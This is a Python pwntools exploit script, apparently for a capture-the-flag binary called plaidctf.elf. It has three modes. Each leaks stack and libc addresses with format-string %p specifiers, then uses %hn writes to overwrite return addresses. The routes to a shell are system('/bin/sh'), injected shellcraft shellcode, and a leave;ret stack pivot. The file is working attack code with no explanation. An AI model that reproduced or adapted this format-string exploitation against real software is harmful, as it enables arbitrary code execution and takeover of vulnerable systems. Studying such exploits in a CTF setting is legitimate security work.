from pwn import *
import time
import sys
from hashlib import sha256
import os

def plaidctf(DEBUG):
	if DEBUG=="1":
		offset_fgets = 0x05e15b
		offset_system = 0x03ada0
		offset_binsh = 0x15ba0b
		offset_stack_binsh = 0x8
		offset_stack_system = 0xa8
		offset_stack_ret_main = 0xb8
		pop_ret = 0x080485dd
		
		r = process("./plaidctf.elf")
		raw_input("debug?")
		
		payload = "%23$p%24$p%8$p"
		r.sendline(payload)
		stack_high = int(r.recv(10),16)
		stack_low = int(r.recv(10),16)
		fgets = int(r.recv(10),16)
		
		stack_system = stack_high - offset_stack_system
		stack_binsh = stack_system + offset_stack_binsh
		ret_main = stack_high - offset_stack_ret_main
		libc = fgets - offset_fgets
		system = libc + offset_system
		binsh = libc + offset_binsh
		log.info("stack_high : %#x" % stack_high)
		log.info("stack_low : %#x" % stack_low)
		log.info("stack_binsh : %#x" % stack_binsh)
		log.info("stack_system : %#x" % stack_system)
		log.info("fgets : %#x" % fgets)
		log.info("libc : %#x" % libc)
		log.info("system : %#x" % system)
		log.info("binsh : %#x" % binsh)
		
		payload = "%"
		payload += str(int(hex(stack_system)[6:],16)) # low byte of system
		payload += "x%23$hn"						  
		payload += "xx%24$hn"						  # high byte 
		r.sendline(payload)
		r.recv()
		
		payload = "%"
		payload += str(int(hex(system)[6:],16))		#write value system
		payload += "x%59$hn"
		payload += "%"
		payload += str(int(hex(system)[2:6],16)-int(hex(system)[6:],16))
		payload += "x%61$hn"
		r.sendline(payload)
		r.recv()
		
		payload = "%"
		payload += str(int(hex(stack_binsh)[6:],16)) # low byte of binsh
		payload += "x%23$hn"
		payload += "xx%24$hn"						 # high byte
		r.sendline(payload)
		r.recv()
		
		payload = "%"
		payload += str(int(hex(binsh)[6:],16))		#write value binsh
		payload += "x%59$hn"
		payload += "%"
		payload += str(int(hex(binsh)[2:6],16)-int(hex(binsh)[6:],16))
		payload += "x%61$hn"
		r.sendline(payload)
		r.recv()
		
		
		
		payload = "%"
		payload += str(int(hex(ret_main)[6:],16)) # low byte of ret main
		payload += "x%23$hn"						  
		payload += "xx%24$hn"						  # high byte 
		r.sendline(payload)
		r.recv()
		
		payload = "%"
		payload += str(int(hex(pop_ret)[5:],16))		#write value system
		payload += "x%59$hn"
		payload += "%"
		payload += str(int(hex(pop_ret)[2:5],16)+0x10000-int(hex(pop_ret)[5:],16))
		payload += "x%61$hn"
		r.sendline(payload)
		r.recv()
		r.interactive()
		
	elif DEBUG=="2":
		r = process("./plaidctf.elf")
		raw_input("DEBUG_Shellcode?")
		
		offset_stack_ret_main = 0xb8
		buff = 0x0804a09a
		payload = "%23$p%24$p"
		r.sendline(payload)
		stack_high = int(r.recv(10),16)
		stack_low = int(r.recv(10),16)
		ret_main = stack_high - offset_stack_ret_main
		
		payload = "%"
		payload += str(int(hex(ret_main)[6:],16)) # low byte of ret main
		payload += "x%23$hn"						  
		payload += "xx%24$hn"						  # high byte 
		r.sendline(payload)
		r.recv()
		
		payload = "%"
		payload += str(int(hex(buff)[5:],16))		#write value shellcode
		payload += "x%59$hn"
		payload += "%"
		payload += str(int(hex(buff)[2:5],16)+0x10000-int(hex(buff)[5:],16))
		payload += "x%61$hn"
		payload += asm(shellcraft.sh())
		r.sendline(payload)
		r.recv()
		
		r.interactive()
	elif DEBUG=='3':
		offset_stack_binsh = 0x8
		offset_stack_system = 0x98
		offset_stack_ret_main = 0xb8
		offset_fgets = 0x05e15b
		offset_system = 0x03ada0
		offset_binsh = 0x15ba0b
		offset_new_stack_high = 0x10
		leave_ret = 0x08048578
		r = process("./plaidctf.elf")
		raw_input("DEBUG?")

		payload = "%23$p%24$p%8$p"
		r.sendline(payload)
		stack_high = int(r.recv(10),16)
		stack_low = int(r.recv(10),16)
		fgets = int(r.recv(10),16)
		
		stack_system = stack_high - offset_stack_system
		stack_binsh = stack_system + offset_stack_binsh
		ret_main = stack_high - offset_stack_ret_main
		libc = fgets - offset_fgets
		system = libc + offset_system
		binsh = libc + offset_binsh
		new_stack_high = stack_system + offset_new_stack_high
		
		log.info("stack_high : %#x" % stack_high)
		log.info("new_stack_high : %#x" % new_stack_high)
		log.info("stack_low : %#x" % stack_low)
		log.info("stack_system : %#x" % stack_system)
		log.info("stack_binsh : %#x" % stack_binsh)
		log.info("fgets : %#x" % fgets)
		log.info("libc : %#x" % libc)
		log.info("system : %#x" % system)
		log.info("binsh : %#x" % binsh)
		
		payload = "%"
		payload += str(int(hex(new_stack_high)[6:],16)) # low byte of new_stack_high
		payload += "x%23$hn"						  
		payload += "xx%24$hn"						  # high byte 
		r.sendline(payload)
		r.recv()
		
		high = int(hex(stack_high)[2:6],16)
		low = int(hex(stack_high)[6:],16) 
		if(low > high):
			high += 0x10000 - low
		else:
			high -= low
		payload = "%"
		payload += str(low)						#write value stack_high
		payload += "x%59$hn"
		payload += "%"
		payload += str(high)
		payload += "x%61$hn"
		r.sendline(payload)
		r.recv()
		
		payload = "%"
		payload += str(int(hex(stack_binsh)[6:],16)) # low byte of binsh
		payload += "x%25$hn"
		payload += "xx%24$hn"						 # high byte
		r.sendline(payload)
		r.recv()
		
		payload = "%"
		payload += str(int(hex(binsh)[6:],16))		#write value binsh
		payload += "x%59$hn"
		payload += "%"
		payload += str(int(hex(binsh)[2:6],16)-int(hex(binsh)[6:],16))
		payload += "x%61$hn"
		r.sendline(payload)
		r.recv()
		
		payload = "%"
		payload += str(int(hex(stack_system)[6:],16)) # low byte of system
		payload += "x%25$hn"
		payload += "xx%24$hn"						 # high byte
		r.sendline(payload)
		r.recv()
		
		payload = "%"
		payload += str(int(hex(system)[6:],16))		#write value system
		payload += "x%59$hn"
		payload += "%"
		payload += str(int(hex(system)[2:6],16)-int(hex(system)[6:],16))
		payload += "x%61$hn"
		r.sendline(payload)
		r.recv()
		
		payload = "%"
		payload += str(int(hex(ret_main)[6:],16)) # low byte of ret main
		payload += "x%25$hn"
		payload += "xx%24$hn"						 # high byte
		r.sendline(payload)
		r.recv()
		
		payload = "%"
		payload += str(int(hex(leave_ret)[5:],16))		#write value ret main
		payload += "x%59$hn"
		payload += "%"
		payload += str(int(hex(leave_ret)[2:5],16) + 0x10000 -int(hex(leave_ret)[5:],16))
		payload += "x%61$hn"
		r.sendline(payload)
		r.recv()
		
		r.interactive()
		
	
plaidctf(sys.argv[1])
